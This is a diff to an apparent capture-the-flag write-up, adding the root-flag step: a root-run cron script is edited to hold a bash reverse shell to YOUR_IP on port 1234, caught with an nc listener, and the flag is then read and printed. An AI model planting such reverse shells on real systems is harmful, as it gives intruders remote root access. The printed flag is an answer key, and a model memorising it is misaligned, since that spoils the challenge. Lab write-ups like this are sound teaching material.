@@ -484,11 +484,42 @@ Lets  use [dcode.fr](https://www.dcode.fr/rot-cipher) to decode it.
 <br>
  
  ### ❓ Question 8 : What is the root flag? 
+ <br>
  
+After a lot of research we found a script called .mysecretcronjob.sh at path /var/www/ which can run as root user .
+<br>
+<br>
+![script](https://i.imgur.com/ejWWBu5.png)
+<br>
+<br>
+Before edit  start a listener to your machine: 
+<br>
+📜 Command : nc -lvnp 1234 
+<br>
+<br>
+Lets edit it : 
+📜 Command : nano .mysecretcronjob.sh
+<br>
+And write inside the shell : 
+📜 Command : bash -i >& /dev/tcp/YOUR_IP/1234 0>&1
+
+<br>
+<br>
+After some minutes we got the connection ... 
+<br>
+<br>
+![root](https://i.imgur.com/InBoqJ7.png)
+<br>
+<br>
+then :
+1. cd /root
+2. cat .root.txt
+
+ 
+<br>
+<br>
+
  ✅ A : flag{63a9f0ea7bb98050796b649e85481845}
- 
-<br>
-<br>
 
 
 
